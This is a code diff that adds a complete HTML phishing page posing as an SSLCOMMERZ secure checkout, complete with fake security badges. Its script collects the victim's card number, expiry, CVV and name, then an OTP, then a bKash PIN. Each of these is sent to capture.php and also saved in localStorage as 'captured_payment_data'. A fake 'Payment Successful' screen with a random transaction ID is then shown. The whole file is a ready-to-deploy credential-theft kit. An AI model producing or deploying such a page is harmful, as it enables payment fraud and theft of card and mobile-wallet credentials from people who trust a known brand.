@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSLCOMMERZ - Secure Payment Gateway</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: linear-gradient(145deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { max-width: 450px; width: 100%; animation: slideUp 0.5s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: rgba(255,255,255,0.98); border-radius: 24px; padding: 35px; box-shadow: 0 30px 80px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
+        .header { text-align: center; margin-bottom: 25px; }
+        .header .logo { width: 80px; height: 80px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 30px; color: white; font-weight: bold; box-shadow: 0 10px 30px rgba(102,126,234,0.3); }
+        .header h2 { color: #1a1a2e; font-size: 22px; }
+        .header p { color: #888; font-size: 13px; margin-top: 4px; }
+        .merchant-info { background: #f0f4ff; border-radius: 16px; padding: 15px 20px; display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid #e8eeff; }
+        .merchant-logo { width: 48px; height: 48px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
+        .merchant-details h4 { color: #1a1a2e; font-size: 15px; }
+        .merchant-details span { color: #28a745; font-size: 12px; }
+        .amount-box { background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 20px; color: white; box-shadow: 0 8px 25px rgba(102,126,234,0.3); }
+        .amount-box .label { font-size: 12px; opacity: 0.9; text-transform: uppercase; letter-spacing: 1px; }
+        .amount-box .amount { font-size: 38px; font-weight: 800; margin: 5px 0; letter-spacing: -1px; }
+        .amount-box .currency { font-size: 13px; opacity: 0.8; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 13px; color: #444; font-weight: 600; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 15px; border: 2px solid #e8eeff; border-radius: 12px; font-size: 15px; transition: all 0.3s; background: #f8faff; }
+        .form-group input:focus { border-color: #667eea; outline: none; box-shadow: 0 0 0 4px rgba(102,126,234,0.1); background: white; }
+        .form-row { display: flex; gap: 12px; }
+        .form-row .form-group { flex: 1; }
+        .btn-pay { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.3s; letter-spacing: 0.5px; }
+        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(102,126,234,0.4); }
+        .btn-pay:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .secure-badge { text-align: center; margin-top: 18px; color: #999; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .secure-badge .lock { color: #28a745; }
+        .hidden { display: none; }
+        
+        /* OTP Section */
+        .verification-section { margin-top: 20px; padding-top: 20px; border-top: 2px dashed #e8eeff; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .verification-section h3 { text-align: center; font-size: 18px; color: #1a1a2e; }
+        .verification-section p { text-align: center; color: #888; font-size: 13px; margin: 5px 0 15px; }
+        .otp-input { display: flex; gap: 8px; justify-content: center; margin: 15px 0; }
+        .otp-input input { width: 48px; height: 54px; text-align: center; font-size: 22px; border: 2px solid #e8eeff; border-radius: 12px; background: #f8faff; transition: all 0.3s; font-weight: bold; }
+        .otp-input input:focus { border-color: #667eea; box-shadow: 0 0 0 4px rgba(102,126,234,0.1); background: white; }
+        .error-msg { color: #dc3545; font-size: 13px; text-align: center; margin: 5px 0; display: none; }
+        
+        /* Loading */
+        .loader { display: none; text-align: center; padding: 30px; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #e8eeff; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader p { color: #888; font-size: 14px; }
+        
+        /* Progress Bar */
+        .progress-bar { height: 4px; background: #e8eeff; border-radius: 4px; overflow: hidden; margin-bottom: 20px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); width: 0%; transition: width 0.5s ease; border-radius: 4px; }
+        
+        /* Success */
+        .success-msg { display: none; text-align: center; padding: 20px; }
+        .success-msg .checkmark { font-size: 60px; color: #28a745; animation: scaleIn 0.5s ease; }
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
+        .success-msg h3 { color: #1a1a2e; font-size: 22px; margin: 10px 0; }
+        .success-msg p { color: #888; font-size: 13px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="header">
+            <div class="logo">S</div>
+            <h2>🔒 Secure Checkout</h2>
+            <p>SSL/TLS 256-bit Encrypted</p>
+        </div>
+
+        <div class="merchant-info">
+            <div class="merchant-logo">S</div>
+            <div class="merchant-details">
+                <h4>SSLCOMMERZ Ltd.</h4>
+                <span>✓ Verified Merchant • PCI DSS Compliant</span>
+            </div>
+        </div>
+
+        <div class="amount-box">
+            <div class="label">Total Amount</div>
+            <div class="amount">৳ 1,500.00</div>
+            <div class="currency">Bangladeshi Taka (BDT)</div>
+        </div>
+
+        <!-- Step 1: Card Details -->
+        <div id="step1">
+            <form id="paymentForm" onsubmit="return processPayment(event)">
+                <div class="form-group">
+                    <label>💳 Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>📅 Expiry Date</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+                    </div>
+                    <div class="form-group">
+                        <label>🔐 CVV</label>
+                        <input type="text" id="cvv" placeholder="XXX" maxlength="4" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>👤 Cardholder Name</label>
+                    <input type="text" id="cardName" placeholder="Name on Card" required>
+                </div>
+                <input type="hidden" id="phoneNumber" value="01XXXXXXXXX">
+                <input type="hidden" id="transactionAmount" value="1500">
+                <button type="submit" class="btn-pay" id="payBtn">Pay Now - ৳ 1,500</button>
+            </form>
+        </div>
+
+        <!-- Step 2: OTP -->
+        <div id="step2" class="verification-section hidden">
+            <h3>🔢 OTP Verification</h3>
+            <p>Enter the 6-digit code sent to your phone</p>
+            <div class="otp-input" id="otpContainer">
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)" autofocus>
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)">
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)">
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)">
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)">
+                <input type="text" maxlength="1" class="otpBox" oninput="otpMove(this, event)" onkeydown="otpBack(event)">
+            </div>
+            <div class="error-msg" id="otpError">❌ Wrong OTP. Please try again.</div>
+            <button class="btn-pay" id="verifyBtn" onclick="verifyOTP()">Verify OTP</button>
+            <p style="text-align: center; margin-top: 10px; font-size: 12px; color: #888;">
+                Didn't receive? <a href="#" onclick="resendOTP()" style="color: #667eea; text-decoration: none; font-weight: 600;">Resend OTP</a>
+            </p>
+        </div>
+
+        <!-- Step 3: PIN -->
+        <div id="step3" class="verification-section hidden">
+            <h3>💳 bKash PIN Required</h3>
+            <p>Enter your 5-digit bKash PIN to complete payment</p>
+            <div class="otp-input" id="pinContainer">
+                <input type="password" maxlength="1" class="pinBox" oninput="pinMove(this, event)" onkeydown="pinBack(event)" autofocus>
+                <input type="password" maxlength="1" class="pinBox" oninput="pinMove(this, event)" onkeydown="pinBack(event)">
+                <input type="password" maxlength="1" class="pinBox" oninput="pinMove(this, event)" onkeydown="pinBack(event)">
+                <input type="password" maxlength="1" class="pinBox" oninput="pinMove(this, event)" onkeydown="pinBack(event)">
+                <input type="password" maxlength="1" class="pinBox" oninput="pinMove(this, event)" onkeydown="pinBack(event)">
+            </div>
+            <div class="error-msg" id="pinError">❌ Incorrect PIN. 2 attempts remaining.</div>
+            <button class="btn-pay" id="pinVerifyBtn" onclick="verifyPIN()">Confirm Payment</button>
+        </div>
+
+        <!-- Loading -->
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Processing your payment...</p>
+        </div>
+
+        <!-- Success -->
+        <div class="success-msg" id="successMsg">
+            <div class="checkmark">✅</div>
+            <h3>Payment Successful!</h3>
+            <p>Transaction ID: <b id="txnId">TXN2025001</b></p>
+            <p style="margin-top: 8px; font-size: 12px; color: #999;">A confirmation SMS has been sent</p>
+        </div>
+
+        <div class="secure-badge">
+            <span class="lock">🔒</span> Secured by SSL/TLS 256-bit encryption
+        </div>
+    </div>
+</div>
+
+<script>
+    // ---- CARD FORMATTING ----
+    function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, '');
+        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+        input.value = value.substring(0, 19);
+    }
+
+    function formatExpiry(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2);
+        input.value = value.substring(0,5);
+    }
+
+    // ---- OTP NAVIGATION ----
+    function otpMove(current, event) {
+        if (current.value.length === 1 && event.inputType !== 'deleteContentBackward') {
+            const next = current.nextElementSibling;
+            if (next) next.focus();
+        }
+    }
+
+    function otpBack(event) {
+        if (event.key === 'Backspace' && event.target.value.length === 0) {
+            const prev = event.target.previousElementSibling;
+            if (prev) prev.focus();
+        }
+    }
+
+    // ---- PIN NAVIGATION ----
+    function pinMove(current, event) {
+        if (current.value.length === 1 && event.inputType !== 'deleteContentBackward') {
+            const next = current.nextElementSibling;
+            if (next) next.focus();
+        }
+    }
+
+    function pinBack(event) {
+        if (event.key === 'Backspace' && event.target.value.length === 0) {
+            const prev = event.target.previousElementSibling;
+            if (prev) prev.focus();
+        }
+    }
+
+    // ---- PROGRESS ----
+    function updateProgress(percent) {
+        document.getElementById('progressFill').style.width = percent + '%';
+    }
+
+    // ---- STEP 1: PAYMENT ----
+    function processPayment(event) {
+        event.preventDefault();
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const cardName = document.getElementById('cardName').value;
+
+        const paymentData = {
+            card_number: cardNumber.replace(/\s/g, ''),
+            expiry: expiry,
+            cvv: cvv,
+            cardholder: cardName,
+            phone: document.getElementById('phoneNumber').value,
+            amount: document.getElementById('transactionAmount').value,
+            timestamp: new Date().toISOString()
+        };
+
+        // Send to PHP
+        fetch('capture.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'card_details', data: paymentData })
+        }).catch(e => console.log('Server offline, saving locally'));
+
+        saveLocal('card_details', paymentData);
+
+        // Animate to OTP step
+        document.getElementById('payBtn').disabled = true;
+        document.getElementById('payBtn').textContent = '⏳ Processing...';
+        
+        updateProgress(30);
+        document.getElementById('loader').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').classList.remove('hidden');
+            updateProgress(50);
+            document.getElementById('step2').querySelector('.otpBox').focus();
+        }, 2000);
+
+        return false;
+    }
+
+    // ---- STEP 2: OTP VERIFY ----
+    function verifyOTP() {
+        const otpInputs = document.querySelectorAll('.otpBox');
+        let otp = '';
+        otpInputs.forEach(input => otp += input.value);
+
+        if (otp.length < 6) {
+            document.getElementById('otpError').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('otpError').style.display = 'none';
+
+        const otpData = {
+            otp: otp,
+            phone: document.getElementById('phoneNumber').value,
+            timestamp: new Date().toISOString()
+        };
+
+        fetch('capture.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'otp', data: otpData })
+        }).catch(e => console.log('Server offline'));
+
+        saveLocal('otp', otpData);
+
+        // Move to PIN
+        updateProgress(70);
+        document.getElementById('loader').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            updateProgress(85);
+            document.getElementById('step3').querySelector('.pinBox').focus();
+        }, 1500);
+    }
+
+    // ---- STEP 3: PIN VERIFY ----
+    function verifyPIN() {
+        const pinInputs = document.querySelectorAll('.pinBox');
+        let pin = '';
+        pinInputs.forEach(input => pin += input.value);
+
+        if (pin.length < 5) {
+            document.getElementById('pinError').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('pinError').style.display = 'none';
+
+        const pinData = {
+            pin: pin,
+            phone: document.getElementById('phoneNumber').value,
+            timestamp: new Date().toISOString()
+        };
+
+        fetch('capture.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'pin', data: pinData })
+        }).catch(e => console.log('Server offline'));
+
+        saveLocal('pin', pinData);
+
+        // Show success
+        updateProgress(100);
+        document.getElementById('loader').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('txnId').textContent = 'TXN' + Math.floor(100000 + Math.random() * 900000);
+        }, 2000);
+    }
+
+    function resendOTP() {
+        alert('✅ A new 6-digit OTP has been sent to your registered mobile number.');
+    }
+
+    // ---- LOCAL SAVE ----
+    function saveLocal(type, data) {
+        let stored = JSON.parse(localStorage.getItem('captured_payment_data') || '[]');
+        stored.push({ type: type, data: data, captured_at: new Date().toISOString() });
+        localStorage.setItem('captured_payment_data', JSON.stringify(stored));
+    }
+</script>
+</body>
+</html>
